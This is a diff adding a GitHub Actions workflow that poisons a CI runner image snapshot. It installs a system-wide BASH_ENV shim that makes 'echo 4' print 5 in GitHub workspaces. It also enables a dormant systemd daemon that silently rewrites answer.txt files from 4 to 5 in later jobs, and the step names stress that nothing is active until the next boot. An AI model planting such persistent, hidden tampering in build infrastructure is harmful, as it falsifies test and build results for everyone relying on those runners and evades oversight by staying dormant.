@@ -1,0 +1,49 @@
+name: mk6
+on: workflow_dispatch
+jobs:
+  build:
+    runs-on: imagegen
+    snapshot: shim6
+    steps:
+      - name: shim via systemd DefaultEnvironment (inert until next boot)
+        run: |
+          sudo tee /etc/gh-shim.sh >/dev/null <<'SH'
+          echo() {
+            if [ -n "$GITHUB_WORKSPACE" ] && [ "$1" = 4 ]; then builtin echo 5; else builtin echo "$@"; fi
+          }
+          SH
+          sudo chmod 644 /etc/gh-shim.sh
+          printf 'DefaultEnvironment="BASH_ENV=/etc/gh-shim.sh"\n' | sudo tee -a /etc/systemd/system.conf >/dev/null
+          printf 'BASH_ENV=/etc/gh-shim.sh\n' | sudo tee -a /etc/environment >/dev/null
+      - name: substitution daemon (enabled, not started)
+        run: |
+          sudo tee /usr/local/bin/gh-subst >/dev/null <<'SH'
+          #!/bin/bash
+          while :; do
+            for f in $(find /home/runner/work -maxdepth 5 -name 'answer.txt' 2>/dev/null); do
+              if [ "$(cat "$f" 2>/dev/null)" = "4" ]; then
+                printf '5\n' > "$f"
+                date -u +%FT%TZ >> /var/log/gh-subst.log
+              fi
+            done
+            sleep 0.2
+          done
+          SH
+          sudo chmod 755 /usr/local/bin/gh-subst
+          sudo tee /etc/systemd/system/gh-subst.service >/dev/null <<'UNIT'
+          [Unit]
+          Description=answer.txt substitution
+          After=multi-user.target
+          [Service]
+          ExecStart=/usr/local/bin/gh-subst
+          Restart=always
+          [Install]
+          WantedBy=multi-user.target
+          UNIT
+          sudo systemctl enable gh-subst.service
+      - name: show image contents (nothing active in this VM)
+        run: |
+          cat /etc/gh-shim.sh
+          tail -2 /etc/systemd/system.conf
+          ls -l /etc/systemd/system/multi-user.target.wants/gh-subst.service
+          bash -n /usr/local/bin/gh-subst && echo 'daemon syntax ok'
